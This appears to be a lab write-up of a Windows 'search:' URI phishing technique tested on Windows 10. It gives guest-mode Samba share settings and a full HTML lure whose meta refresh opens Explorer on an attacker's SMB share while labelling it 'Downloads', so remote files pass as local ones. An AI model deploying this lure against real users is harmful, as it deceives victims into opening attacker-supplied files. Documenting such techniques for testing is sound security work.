## Victim's Machine
- OS - Windows 10 1909
- Build - 18363.1139

## Attacker's Machine
- OS - Ubuntu noble 24.04 x86_64
- Kernel - Linux 6.8.0-35-generic

## Setting Up

#### Attacker's Machine
- A SMB share needs to be setup on the Attacker's machine.
- The shared folder should be accessible by guests.
- SMB version needs to be forces between 2 and 3.
```Text
client min protocol = SMB2
client max protocol = SMB3
```
- The shared folder needs to be set to guest mode.
```Text
[Share]
path = /home/share
public = yes
guest only = yes
force create mode = 0666
force directory mode = 0777
browseable = yes
```
- For testing purposes, there is a text file ( Hacked.txt )  in the folder.![](Attachments/Pasted%20image%2020240722004846.png)

#### Victim's Machine
- The victim machine has a HTML file designed to open up the payload on the attackers machine and disguise it as a local file.
- The HTML file
```HTML
<html>
<head></head>
<body>
    <div id="in-page-channel-node-id" data-channel-name="in-page-channel-cnXeD0"></div>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
    <title>Untitled</title>
    <meta http-equiv="refresh" content="0; URL=search:query=hacked&amp;crumb=location:\\x-VBOX\Share&amp;displayname=Downloads"
    <p><a href="search:query=hacked&amp;crumb=location:\\x-VBOX\Share\&amp;displayname=Downloads">Untitled</p>
</body>
</html>
```


## The Exploit
- Victim opens the HTML file to see a webpage with a popup.![](Attachments/Pasted%20image%2020240722005020.png)
- Opening Windows Explorer![](Attachments/Pasted%20image%2020240722005156.png)
	1. Windows has searched for "hacked" .
	2. It appears as if the file is in "Downloads" .


## Notes
- Http servers didn't work for the exploit. Cannot access the files through windows explorer.
- Default linux Samba shares are not detected by windows as they use SMB1. SMB V2 & V3 needs to be forced in settings.